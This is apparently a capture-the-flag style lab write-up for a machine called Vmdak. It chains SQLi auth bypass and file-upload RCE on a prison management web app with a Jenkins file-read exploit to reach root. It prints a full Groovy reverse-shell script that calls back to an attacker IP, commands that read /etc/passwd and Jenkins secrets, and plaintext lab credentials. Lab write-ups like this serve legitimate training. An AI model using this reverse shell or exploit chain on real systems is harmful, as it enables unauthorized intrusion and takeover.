# Vmdak \[Inter]

## Report

FTP server hosts a config.xml for a Jenkins version vulnerable to file read, it also mentions path to root password for install

Fast5 Prison Management System running on port 9443 is vulnerable to auth bypass via SQLi, it is also vulnerable to RCE via insecure file upload of profile pictures for users. We also find a password in the leave record. Exploit to get reverse shell as www-data.

Find user 'vmdak' and use the password we found earlier. A port 8080 is found via netstat and port forward to get access to Jenkins instance. Fetch root password via file read exploit for Jenkins found from FTP and run Groovy reverse shell script to become root.

## Loot

### Enumeration

192.168.106.103

21, 22, 80, 9443

#### 21 (FTP)

config.xml -> Jenkins 2.401.2

```
<InitialRootPassword>/root/.jenkins/secrets/initialAdminPassword></InitialRootPassword>
```

#### 80

Nothing

#### 9443 (HTTPS)

Fast5 Prison Management System

* admin.php, no employee login

### Attack Vectors

Fast5 Prison Management System&#x20;

* SQLi Auth bypass
* Get creds&#x20;
* RCE via file upload to get shell as www-data

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### PrivEsc

```
ssh -L 8080:127.0.0.1:8080 vmdak@192.168.106.103
python3 51993.py -u http://127.0.0.1:8080
/etc/passwd [PoC first always]
/root/.jenkins/secrets/initialAdminPassword

Finish Jenkins setup
Execute groovy revshell script
String host="192.168.45.236";int port=80;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close()
```

### Creds

`admin:admin123 (Caroline Bassey)`

`vmdak:RonnyCache001`

### Proof

{% embed url="https://github.com/Aa1b/mycve/blob/main/Readme.md" %}

{% embed url="https://github.com/xaitax/CVE-2024-23897" %}
